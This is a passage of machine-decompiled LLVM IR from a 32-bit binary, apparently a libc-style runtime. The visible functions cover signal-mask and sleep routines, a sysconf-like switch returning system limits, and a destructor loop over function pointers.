  %v1_8053e79 = inttoptr i32 %v1_8053e72 to i32*
  %v2_8053e79 = load i32, i32* %v1_8053e79, align 4
  store i32 %v2_8053e79, i32* @esi, align 4
  store i32 %v2_8053dfc, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053e88 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053e88 = call i32 @function_805245d(i32 2, %_TYPEDEF_sigset_t* %v3_8053e88, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053e93 = load i32, i32* @esi, align 4
  %v1_8053e93 = load i32, i32* @ebx, align 4
  %v2_8053e93 = inttoptr i32 %v1_8053e93 to i32*
  store i32 %v0_8053e93, i32* %v2_8053e93, align 4
  %v0_8053f28.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f1e

dec_label_pc_8053e9a:                             ; preds = %dec_label_pc_8053e5c
  %v3_8053e9a = load i32, i32* %stack_var_-420, align 4
  %v12_8053e9a = icmp eq i32 %v3_8053e9a, 1
  %v2_8053ea6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053ea6, i32* @ebx, align 4
  %v1_8053ead = icmp eq i1 %v12_8053e9a, false
  br i1 %v1_8053ead, label %dec_label_pc_8053ed4, label %dec_label_pc_8053eaf

dec_label_pc_8053eaf:                             ; preds = %dec_label_pc_8053e9a
  %v0_8053eaf = load i32, i32* @edi, align 4
  store i32 %v2_8053ea6, i32* %stack_var_-460, align 4
  %v4_8053eb3 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053eb3 = call i32 @function_8054847(%timespec* %v4_8053eb3, i32 %v2_8053ea6, i32 %v0_8053eaf, i32 %v0_8053eaf)
  store i32 %v5_8053eb3, i32* %eax.global-to-local, align 4
  store i32 %v5_8053eb3, i32* @edi, align 4
  %v1_8053eba = call i32 @function_8052729(i32 %v2_8053ea6)
  store i32 %v1_8053eba, i32* %eax.global-to-local, align 4
  store i32 %v1_8053eba, i32* @ebx, align 4
  %v1_8053ec4 = inttoptr i32 %v1_8053eba to i32*
  %v2_8053ec4 = load i32, i32* %v1_8053ec4, align 4
  store i32 %v2_8053ec4, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053ecb = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053ecb = call i32 @function_805245d(i32 2, %_TYPEDEF_sigset_t* %v3_8053ecb, i32 0)
  store i32 %v4_8053ecb, i32* %eax.global-to-local, align 4
  %v0_8053ed0 = load i32, i32* @esi, align 4
  %v1_8053ed0 = load i32, i32* @ebx, align 4
  %v2_8053ed0 = inttoptr i32 %v1_8053ed0 to i32*
  store i32 %v0_8053ed0, i32* %v2_8053ed0, align 4
  %v0_8053efa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053ef7

dec_label_pc_8053ed4:                             ; preds = %dec_label_pc_8053e9a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053eda = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053eda = call i32 @function_805245d(i32 2, %_TYPEDEF_sigset_t* %v3_8053eda, i32 0)
  store i32 %v4_8053eda, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053ef0

dec_label_pc_8053ee5:                             ; preds = %dec_label_pc_8053e17
  %v2_8053ee7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053ee7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ef0

dec_label_pc_8053ef0:                             ; preds = %dec_label_pc_8053ed4, %dec_label_pc_8053ee5
  %storemerge3.pre-phi = phi i32 [ %v2_8053ea6, %dec_label_pc_8053ed4 ], [ %v2_8053ee7, %dec_label_pc_8053ee5 ]
  %v3_8053ef0 = phi i32 [ %v2_8053dfc, %dec_label_pc_8053ed4 ], [ %v4_8053e1c, %dec_label_pc_8053ee5 ]
  %v2_8053ef0 = phi i32 [ 0, %dec_label_pc_8053ed4 ], [ %v4_8053e1c, %dec_label_pc_8053ee5 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8053ef0 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053ef0 = call i32 @function_8054847(%timespec* %v4_8053ef0, i32 %storemerge3.pre-phi, i32 %v2_8053ef0, i32 %v3_8053ef0)
  store i32 %v5_8053ef0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ef7

dec_label_pc_8053ef7:                             ; preds = %dec_label_pc_8053eaf, %dec_label_pc_8053ef0
  %v0_8053efa = phi i32 [ %v0_8053efa.pre, %dec_label_pc_8053eaf ], [ %v5_8053ef0, %dec_label_pc_8053ef0 ]
  %v1_8053efa = icmp eq i32 %v0_8053efa, 0
  br i1 %v1_8053efa, label %dec_label_pc_8053f17, label %dec_label_pc_8053efe

dec_label_pc_8053efe:                             ; preds = %dec_label_pc_8053ef7
  %v4_8053f0e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8053f0e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f1e

dec_label_pc_8053f17:                             ; preds = %dec_label_pc_8053da0, %dec_label_pc_8053ef7
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f1e

dec_label_pc_8053f1b:                             ; preds = %dec_label_pc_8053e40, %dec_label_pc_8053dfb, %dec_label_pc_8053dcd
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f1e

dec_label_pc_8053f1e:                             ; preds = %dec_label_pc_8053f17, %dec_label_pc_8053efe, %dec_label_pc_8053e72, %dec_label_pc_8053f1b
  %v0_8053f28 = phi i32 [ 0, %dec_label_pc_8053f17 ], [ %v4_8053f0e, %dec_label_pc_8053efe ], [ %v0_8053f28.pre, %dec_label_pc_8053e72 ], [ -1, %dec_label_pc_8053f1b ]
  store i32 %v0_8053da3, i32* @ebx, align 4
  store i32 %v0_8053da2, i32* @esi, align 4
  store i32 %v0_8053da1, i32* @edi, align 4
  store i32 %v0_8053da0, i32* @ebp, align 4
  ret i32 %v0_8053f28

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8053eba, { 1, 0, 2 }
  uselistorder i32 %v2_8053ea6, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8053e3d, { 2, 1, 0 }
  uselistorder i32 %v4_8053e1c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8053dfc, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8053de3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053dca, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 6, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 24, 25, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @function_80542ef, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8052b3e, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053f1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053f17, { 1, 0 }
  uselistorder label %dec_label_pc_8053ef7, { 1, 0 }
  uselistorder label %dec_label_pc_8053ef0, { 1, 0 }
  uselistorder label %dec_label_pc_8053e32.dec_label_pc_8053e32_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053dbf.dec_label_pc_8053dbf_crit_edge, { 1, 0 }
}

define i32 @function_8053f29(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053f29:
  switch i32 %arg1, label %dec_label_pc_8053f48 [
    i32 0, label %dec_label_pc_8053f58
    i32 1, label %dec_label_pc_805403d
    i32 2, label %dec_label_pc_8053f62
    i32 3, label %dec_label_pc_8053f6c
    i32 4, label %dec_label_pc_8053f76
    i32 5, label %dec_label_pc_805400c
    i32 6, label %dec_label_pc_8053f7e
    i32 7, label %dec_label_pc_8053f3e
    i32 8, label %dec_label_pc_8053f3e
    i32 9, label %dec_label_pc_8053f3e
    i32 10, label %dec_label_pc_8053f3e
    i32 11, label %dec_label_pc_8053f3e
    i32 12, label %dec_label_pc_8053f3e
    i32 13, label %dec_label_pc_8053f3e
    i32 14, label %dec_label_pc_8053f3e
    i32 15, label %dec_label_pc_8053f3e
    i32 16, label %dec_label_pc_8053f3e
    i32 17, label %dec_label_pc_8053f3e
    i32 18, label %dec_label_pc_8053f3e
    i32 19, label %dec_label_pc_8053f3e
    i32 20, label %dec_label_pc_8053f3e
    i32 21, label %dec_label_pc_8053f3e
    i32 22, label %dec_label_pc_8053f3e
    i32 23, label %dec_label_pc_805403d
    i32 24, label %dec_label_pc_805403d
    i32 25, label %dec_label_pc_8054049
    i32 26, label %dec_label_pc_805401a
    i32 27, label %dec_label_pc_805403d
    i32 28, label %dec_label_pc_8053f90
    i32 29, label %dec_label_pc_8054013
    i32 30, label %dec_label_pc_8053f88
    i32 31, label %dec_label_pc_8054028
    i32 32, label %dec_label_pc_805403d
    i32 33, label %dec_label_pc_805403d
    i32 34, label %dec_label_pc_805403d
    i32 35, label %dec_label_pc_8054021
    i32 36, label %dec_label_pc_8054050
    i32 37, label %dec_label_pc_8054057
    i32 38, label %dec_label_pc_8054050
    i32 39, label %dec_label_pc_8053f9a
    i32 40, label %dec_label_pc_805405e
    i32 41, label %dec_label_pc_805403d
    i32 42, label %dec_label_pc_8054028
    i32 43, label %dec_label_pc_8054057
    i32 44, label %dec_label_pc_8054065
    i32 45, label %dec_label_pc_8054057
    i32 46, label %dec_label_pc_8054013
    i32 47, label %dec_label_pc_8054013
    i32 48, label %dec_label_pc_8054013
    i32 49, label %dec_label_pc_805403d
    i32 50, label %dec_label_pc_805403d
    i32 51, label %dec_label_pc_8054013
    i32 52, label %dec_label_pc_8054013
    i32 53, label %dec_label_pc_805403d
    i32 54, label %dec_label_pc_805403d
    i32 55, label %dec_label_pc_805403d
    i32 56, label %dec_label_pc_805403d
    i32 57, label %dec_label_pc_805403d
    i32 58, label %dec_label_pc_805403d
    i32 59, label %dec_label_pc_805403d
    i32 60, label %dec_label_pc_805403d
    i32 61, label %dec_label_pc_805403d
    i32 62, label %dec_label_pc_805403d
    i32 63, label %dec_label_pc_805403d
    i32 64, label %dec_label_pc_805403d
    i32 65, label %dec_label_pc_805403d
    i32 66, label %dec_label_pc_805403d
    i32 67, label %dec_label_pc_8053f3e
    i32 68, label %dec_label_pc_8053f3e
    i32 69, label %dec_label_pc_8054021
    i32 70, label %dec_label_pc_8054021
    i32 71, label %dec_label_pc_8054021
    i32 72, label %dec_label_pc_8054028
    i32 73, label %dec_label_pc_805402f
    i32 74, label %dec_label_pc_8054036
    i32 75, label %dec_label_pc_8053fa4
    i32 76, label %dec_label_pc_8054036
    i32 77, label %dec_label_pc_8053f3e
    i32 78, label %dec_label_pc_8053f3e
    i32 79, label %dec_label_pc_8053f3e
    i32 80, label %dec_label_pc_8053f3e
    i32 81, label %dec_label_pc_8053f3e
    i32 82, label %dec_label_pc_8053f3e
    i32 83, label %dec_label_pc_8053f3e
    i32 84, label %dec_label_pc_8053f3e
    i32 85, label %dec_label_pc_805403d
    i32 86, label %dec_label_pc_805403d
    i32 87, label %dec_label_pc_805401a
    i32 88, label %dec_label_pc_8053fae
    i32 89, label %dec_label_pc_8053fb8
    i32 90, label %dec_label_pc_805402f
    i32 91, label %dec_label_pc_8053f3e
    i32 92, label %dec_label_pc_8053f3e
    i32 93, label %dec_label_pc_8053f3e
    i32 94, label %dec_label_pc_8053f3e
    i32 95, label %dec_label_pc_8054013
    i32 96, label %dec_label_pc_805403d
    i32 97, label %dec_label_pc_805403d
    i32 98, label %dec_label_pc_8053f3e
    i32 99, label %dec_label_pc_8053f3e
    i32 100, label %dec_label_pc_8053f3e
    i32 101, label %dec_label_pc_8053fc2
    i32 102, label %dec_label_pc_8054005
    i32 103, label %dec_label_pc_8054042
    i32 104, label %dec_label_pc_805401a
    i32 105, label %dec_label_pc_8053fcc
    i32 106, label %dec_label_pc_8054028
    i32 107, label %dec_label_pc_8054028
    i32 108, label %dec_label_pc_805400c
    i32 109, label %dec_label_pc_8054049
    i32 110, label %dec_label_pc_8054065
    i32 111, label %dec_label_pc_8054005
    i32 112, label %dec_label_pc_8054042
    i32 113, label %dec_label_pc_8054065
    i32 114, label %dec_label_pc_8053fd6
    i32 115, label %dec_label_pc_805405e
    i32 116, label %dec_label_pc_805403d
    i32 117, label %dec_label_pc_805403d
    i32 118, label %dec_label_pc_8053fe0
    i32 119, label %dec_label_pc_8053fea
    i32 120, label %dec_label_pc_8054057
    i32 121, label %dec_label_pc_805401a
    i32 122, label %dec_label_pc_805401a
    i32 123, label %dec_label_pc_805401a
    i32 124, label %dec_label_pc_805401a
    i32 125, label %dec_label_pc_8053f3e
    i32 126, label %dec_label_pc_8053f3e
    i32 127, label %dec_label_pc_805403d
    i32 128, label %dec_label_pc_805403d
    i32 129, label %dec_label_pc_8053f3e
    i32 130, label %dec_label_pc_8053f3e
    i32 131, label %dec_label_pc_805403d
    i32 149, label %dec_label_pc_8053ff1
  ]

dec_label_pc_8053f3e:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053f48:                             ; preds = %dec_label_pc_8053f29
  %v1_8053f48 = call i32 @function_8052729(i32 ptrtoint (i32* @0 to i32))
  %v1_8053f4d = inttoptr i32 %v1_8053f48 to i32*
  store i32 22, i32* %v1_8053f4d, align 4
  br label %dec_label_pc_805403d

dec_label_pc_8053f58:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053f62:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053f6c:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053f76:                             ; preds = %dec_label_pc_8053f29
  %v0_8053f79 = call i32 @function_8054675()
  br label %dec_label_pc_8053f7e

dec_label_pc_8053f7e:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f76
  br label %dec_label_pc_805406a

dec_label_pc_8053f88:                             ; preds = %dec_label_pc_8053f29
  %v0_8053f8b = call i32 @function_805470c()
  br label %dec_label_pc_8053f90

dec_label_pc_8053f90:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f88
  br label %dec_label_pc_805406a

dec_label_pc_8053f9a:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053fa4:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053fae:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053fb8:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053fc2:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053fcc:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053fd6:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053fe0:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053fea:                             ; preds = %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8053ff1:                             ; preds = %dec_label_pc_8053f29
  %v5_8053ff7 = call i32 @function_8054478(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8053fff = icmp slt i32 %v5_8053ff7, 0
  %v1_8054001 = icmp eq i1 %v2_8053fff, false
  br i1 %v1_8054001, label %dec_label_pc_8054013, label %dec_label_pc_805403d

dec_label_pc_8054005:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_805400c:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8054013:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053ff1
  br label %dec_label_pc_805406a

dec_label_pc_805401a:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8054021:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8054028:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_805402f:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8054036:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_805403d:                             ; preds = %dec_label_pc_8053ff1, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f48
  br label %dec_label_pc_805406a

dec_label_pc_8054042:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8054049:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8054050:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8054057:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_805405e:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_8054065:                             ; preds = %dec_label_pc_8053f29, %dec_label_pc_8053f29, %dec_label_pc_8053f29
  br label %dec_label_pc_805406a

dec_label_pc_805406a:                             ; preds = %dec_label_pc_805405e, %dec_label_pc_8054057, %dec_label_pc_8054050, %dec_label_pc_8054049, %dec_label_pc_8054042, %dec_label_pc_8054036, %dec_label_pc_805402f, %dec_label_pc_8054028, %dec_label_pc_8054021, %dec_label_pc_805401a, %dec_label_pc_805400c, %dec_label_pc_8054005, %dec_label_pc_8054013, %dec_label_pc_8053fea, %dec_label_pc_8053fe0, %dec_label_pc_8053fd6, %dec_label_pc_8053fcc, %dec_label_pc_8053fc2, %dec_label_pc_8053fb8, %dec_label_pc_8053fae, %dec_label_pc_8053fa4, %dec_label_pc_8053f9a, %dec_label_pc_8053f90, %dec_label_pc_8053f7e, %dec_label_pc_8053f6c, %dec_label_pc_8053f62, %dec_label_pc_8053f58, %dec_label_pc_8053f3e, %dec_label_pc_805403d, %dec_label_pc_8054065
  %v0_805406d = phi i32 [ 255, %dec_label_pc_805405e ], [ 2048, %dec_label_pc_8054057 ], [ 99, %dec_label_pc_8054050 ], [ 20, %dec_label_pc_8054049 ], [ -128, %dec_label_pc_8054042 ], [ 1024, %dec_label_pc_8054036 ], [ 4, %dec_label_pc_805402f ], [ 32, %dec_label_pc_8054028 ], [ 256, %dec_label_pc_8054021 ], [ 2147483647, %dec_label_pc_805401a ], [ 16, %dec_label_pc_805400c ], [ 127, %dec_label_pc_8054005 ], [ 200112, %dec_label_pc_8054013 ], [ 9, %dec_label_pc_8053fea ], [ 65535, %dec_label_pc_8053fe0 ], [ -32768, %dec_label_pc_8053fd6 ], [ -2147483648, %dec_label_pc_8053fcc ], [ 8, %dec_label_pc_8053fc2 ], [ 500, %dec_label_pc_8053fb8 ], [ 4096, %dec_label_pc_8053fae ], [ 16384, %dec_label_pc_8053fa4 ], [ 1000, %dec_label_pc_8053f9a ], [ 32768, %dec_label_pc_8053f90 ], [ 6, %dec_label_pc_8053f7e ], [ 65536, %dec_label_pc_8053f6c ], [ 100, %dec_label_pc_8053f62 ], [ 131072, %dec_label_pc_8053f58 ], [ 1, %dec_label_pc_8053f3e ], [ -1, %dec_label_pc_805403d ], [ 32767, %dec_label_pc_8054065 ]
  ret i32 %v0_805406d

; uselistorder directives
  uselistorder i32 65536, { 33, 34, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 15, 13, 16, 18, 17, 19, 1, 20, 0, 2, 23, 21, 24, 22, 27, 25, 26, 28, 29, 30, 31, 32 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 20, 21, 23, 24, 14, 15, 1, 2, 12, 13, 16, 17, 18, 19, 3, 4, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 65535, { 3, 0, 1, 2, 4 }
  uselistorder i32 1024, { 2, 0, 3, 1, 4 }
  uselistorder i32 2048, { 5, 1, 6, 2, 0, 3, 4 }
  uselistorder i32 255, { 1, 3, 4, 6, 2, 7, 8, 9, 5, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 131, { 4, 0, 1, 3, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 124, { 4, 5, 3, 0, 1, 6, 2 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 2, 0, 1 }
  uselistorder i32 116, { 1, 2, 0 }
  uselistorder i32 112, { 3, 0, 1, 4, 5, 2, 6, 7, 8 }
  uselistorder i32 111, { 4, 0, 2, 1, 3 }
  uselistorder i32 110, { 5, 1, 3, 2, 4, 0 }
  uselistorder i32 108, { 20, 21, 22, 17, 23, 11, 2, 15, 0, 1, 24, 12, 13, 18, 19, 25, 26, 14, 27, 3, 4, 5, 28, 29, 6, 30, 7, 8, 9, 10, 16, 31 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 104, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 99, { 2, 3, 1, 0 }
  uselistorder i32 96, { 1, 2, 3, 0, 4 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 11, 12, 1, 0, 4, 2, 3, 6, 13, 14, 9, 10, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 8, 26, 27, 28, 5, 29, 30, 7, 35, 32, 33, 34, 31, 36 }
  uselistorder i32 87, { 2, 0, 1 }
  uselistorder i32 83, { 2, 0, 1 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 76, { 3, 4, 1, 5, 0, 6, 2 }
  uselistorder i32 68, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 60, { 3, 0, 1, 2 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 55, { 2, 0, 1, 3 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i32 43, { 7, 0, 3, 1, 4, 2, 5, 8, 6 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i32 39, { 1, 2, 3, 0 }
  uselistorder i32 38, { 2, 0, 3, 4, 1 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 34, { 3, 4, 5, 2, 0, 1, 6, 7, 8 }
  uselistorder i32 33, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 25, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 23, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 21, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder i32 17, { 8, 5, 7, 2, 3, 1, 0, 4, 6, 9, 10 }
  uselistorder i32 13, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 9, { 3, 11, 0, 1, 7, 16, 6, 4, 8, 5, 9, 14, 13, 12, 17, 18, 19, 20, 21, 22, 23, 10, 15, 2 }
  uselistorder i32 6, { 0, 14, 4, 5, 1, 28, 6, 2, 7, 16, 15, 17, 18, 19, 20, 21, 22, 23, 11, 8, 12, 13, 24, 25, 26, 27, 9, 3, 10 }
  uselistorder i32 5, { 13, 1, 18, 19, 7, 6, 8, 5, 15, 16, 14, 4, 2, 3, 17, 0, 9, 10, 12, 11 }
  uselistorder label %dec_label_pc_805406a, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_805403d, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8054013, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053f90, { 1, 0 }
  uselistorder label %dec_label_pc_8053f7e, { 1, 0 }
}

define i32 @function_805406e() local_unnamed_addr {
dec_label_pc_805406e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805406e = load i32, i32* @ebx, align 4
  store i32 %v0_805406e, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), i32 0), label %dec_label_pc_8054082, label %dec_label_pc_805408f

dec_label_pc_8054082:                             ; preds = %dec_label_pc_805406e, %dec_label_pc_8054082
  %v1_80540898 = phi i32 [ %v1_8054089, %dec_label_pc_8054082 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), i32 -1), %dec_label_pc_805406e ]
  store i32 ptrtoint (i32* @global_var_8054089.234 to i32), i32* %stack_var_-16, align 4
  %v5_8054082 = mul i32 %v1_80540898, 4
  %v6_8054082 = add i32 %v5_8054082, ptrtoint (i32* @global_var_80567e4.233 to i32)
  %v7_8054082 = inttoptr i32 %v6_8054082 to i32*
  %v8_8054082 = load i32, i32* %v7_8054082, align 4
  call void @__pseudo_call(i32 %v8_8054082)
  %v0_8054089.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054089 = add i32 %v0_8054089.pre, -1
  store i32 %v1_8054089, i32* %ebx.global-to-local, align 4
  %v10_805408a = icmp eq i32 %v0_8054089.pre, 0
  %v1_805408d = icmp eq i1 %v10_805408a, false
  br i1 %v1_805408d, label %dec_label_pc_8054082, label %dec_label_pc_805408f

dec_label_pc_805408f:                             ; preds = %dec_label_pc_8054082, %dec_label_pc_805406e
  %v0_805408f = load i32, i32* @global_var_8056948.235, align 8
  %v1_8054094 = icmp eq i32 %v0_805408f, 0
  br i1 %v1_8054094, label %dec_label_pc_805409a, label %dec_label_pc_8054098

dec_label_pc_8054098:                             ; preds = %dec_label_pc_805408f
  %v0_8054098 = load i32, i32* %stack_var_-16, align 4
  %v1_8054098 = call i32 @unknown_0(i32 %v0_8054098)
  br label %dec_label_pc_805409a

dec_label_pc_805409a:                             ; preds = %dec_label_pc_8054098, %dec_label_pc_805408f
